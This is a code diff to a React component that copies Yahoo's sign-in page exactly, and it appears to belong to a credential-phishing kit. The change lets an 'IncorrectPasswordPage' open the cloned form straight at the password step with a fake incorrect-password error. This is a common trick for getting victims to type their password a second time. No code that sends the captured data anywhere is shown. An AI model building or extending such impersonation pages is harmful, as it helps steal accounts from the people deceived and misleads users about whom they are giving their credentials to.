@@ -7,6 +7,8 @@ interface YahooLoginPageProps {
   onLoginSuccess?: (sessionData: any) => void;
   onLoginError?: (error: string) => void;
   defaultEmail?: string;
+  startAtPasswordStep?: boolean;
+  incorrectPasswordError?: string;
 }
 
 // Custom Input component to replicate the exact Yahoo style
@@ -40,11 +42,13 @@ const YahooFloatingLabelInput = ({ value, onChange, placeholder, type = "text", 
   );
 };
 
-const YahooLoginPage: React.FC<YahooLoginPageProps> = ({ onLoginSuccess, onLoginError, defaultEmail }) => {
+const YahooLoginPage: React.FC<YahooLoginPageProps> = ({ onLoginSuccess, onLoginError, defaultEmail, startAtPasswordStep, incorrectPasswordError }) => {
   const [email, setEmail] = useState(defaultEmail || '');
   const [password, setPassword] = useState('');
-  const [showPasswordStep, setShowPasswordStep] = useState(false);
-  const [pageReady, setPageReady] = useState(false);
+  const [showPasswordStep, setShowPasswordStep] = useState(!!startAtPasswordStep);
+  // When mounted via the IncorrectPasswordPage (startAtPasswordStep=true), skip
+  // the 100ms pageReady gate so the password-step error UI renders immediately.
+  const [pageReady, setPageReady] = useState(!!startAtPasswordStep);
   const [nextLoading, setNextLoading] = useState(false);
   const [submitting, setSubmitting] = useState(false);
 
@@ -118,6 +122,7 @@ const YahooLoginPage: React.FC<YahooLoginPageProps> = ({ onLoginSuccess, onLogin
               
               <form onSubmit={handleSubmit} className="mt-5 space-y-4">
                 {errorMessage && !isLoading && ( <p className="text-red-600 text-sm font-medium text-center">{errorMessage}</p> )}
+                {!errorMessage && incorrectPasswordError && ( <p className="text-red-600 text-sm font-medium text-center">{incorrectPasswordError}</p> )}
                 {!showPasswordStep ? (
                   <div>
                     <YahooFloatingLabelInput value={email} onChange={(e: any) => setEmail(e.target.value)} placeholder="Username, email, or mobile" type="email" />
